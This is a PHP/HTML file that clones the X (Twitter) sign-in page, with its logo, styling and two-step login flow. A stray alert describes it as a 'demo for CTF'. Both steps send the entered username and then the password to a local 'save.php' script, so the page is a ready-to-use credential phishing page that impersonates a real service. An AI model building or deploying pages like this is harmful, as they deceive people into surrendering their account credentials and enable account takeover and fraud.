<?php
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X / Twitter - Log in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 32px;
            text-align: center;
        }
        .logo {
            margin-bottom: 28px;
        }
        .logo svg {
            width: 40px;
            height: 40px;
        }
        h2 {
            font-size: 23px;
            font-weight: 700;
            margin-bottom: 28px;
            text-align: left;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .form-group input {
            width: 100%;
            padding: 16px 12px;
            background: transparent;
            border: 1px solid #333;
            border-radius: 4px;
            color: #fff;
            font-size: 17px;
            outline: none;
            transition: border-color 0.2s;
        }
        .form-group input:focus {
            border-color: #1d9bf0;
        }
        .form-group input::placeholder {
            color: #71767b;
        }
        .btn-next {
            width: 100%;
            padding: 14px;
            background: #fff;
            color: #000;
            border: none;
            border-radius: 9999px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }
        .btn-next:hover {
            background: #e6e6e6;
        }
        .btn-password {
            width: 100%;
            padding: 14px;
            background: transparent;
            color: #fff;
            border: 1px solid #333;
            border-radius: 9999px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }
        .btn-password:hover {
            background: rgba(239, 243, 244, 0.1);
        }
        .forgot-link {
            display: block;
            margin-top: 12px;
            color: #1d9bf0;
            text-decoration: none;
            font-size: 13px;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .signup-text {
            margin-top: 40px;
            font-size: 13px;
            color: #71767b;
        }
        .signup-text a {
            color: #1d9bf0;
            text-decoration: none;
        }
        .signup-text a:hover {
            text-decoration: underline;
        }
        .error-msg {
            display: none;
            background: rgba(244, 33, 46, 0.2);
            border: 1px solid #f4212e;
            color: #f4212e;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 16px;
            font-size: 14px;
            text-align: left;
        }
        /* Password step hidden by default */
        #password-step {
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <svg viewBox="0 0 24 24" fill="#fff">
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
        </svg>
    </div>

    <h2>Sign in to X</h2>

    <div id="error-msg" class="error-msg"></div>

    <!-- Step 1: Email/Phone/Username -->
    <div id="email-step">
        <form action="save.php" method="POST" id="step1-form">
            <input type="hidden" name="step" value="email">
            <div class="form-group">
                <input type="text" name="identifier" placeholder="Phone, email, or username" required autofocus>
            </div>
            <button type="submit" class="btn-next">Next</button>
        </form>

        <button class="btn-password" onclick="forgotPassword()">Forgot password?</button>

        <div class="signup-text">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <!-- Step 2: Password (shown after email step) -->
    <div id="password-step">
        <form action="save.php" method="POST" id="step2-form">
            <input type="hidden" name="step" value="password">
            <input type="hidden" name="identifier" id="stored-identifier">
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required autofocus>
            </div>
            <button type="submit" class="btn-next">Log in</button>
        </form>

        <a href="#" class="forgot-link">Forgot password?</a>

        <div class="signup-text">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</div>

<script>
    // Simple client-side step handler
    // The actual logic is handled by save.php with step parameter

    function forgotPassword() {
        alert('Password reset functionality - demo for CTF');
    }

    // On page load, check if we should show password step
    <?php if(isset($_GET['step']) && $_GET['step'] === 'password' && isset($_GET['id'])): ?>
    document.getElementById('email-step').style.display = 'none';
    document.getElementById('password-step').style.display = 'block';
    document.getElementById('stored-identifier').value = '<?php echo htmlspecialchars($_GET['id']); ?>';
    <?php endif; ?>
</script>

</body>
</html>